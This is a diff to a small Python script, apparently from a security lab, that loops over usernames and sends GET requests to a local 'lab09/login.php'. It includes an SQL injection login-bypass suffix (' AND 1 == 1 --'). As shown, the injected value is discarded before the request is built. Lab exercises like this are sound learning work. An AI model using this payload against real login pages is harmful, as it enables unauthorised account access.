@@ -4,6 +4,15 @@ import urllib.parse as urlp
 import urllib.request as urlr
 
 
+def send_request(params, url):
+    query = urlp.urlencode(params)
+    url = url + "?" + query
+
+    with urlr.urlopen(url) as response:
+        response_text = response.read(400)
+        print(response_text)
+
+
 def inject_bypass(user):
     user = user + " AND 1 == 1 --"
 
@@ -38,17 +47,14 @@ usernames = {
     "nobody"
 }
 
-
 url = "http://localhost/lab09/login.php"
 
-params = {
-    "u": "test",
-    "p": "pass"
-}
+for username in usernames:
+    inject_bypass(username)
 
-query = urlp.urlencode(params)
-url = url + "?" + query
+    params = {
+        "u": username,
+        "p": ""
+    }
 
-with urlr.urlopen(url) as response:
-    response_text = response.read(400)
-    print(response_text)
+    send_request(params, url)
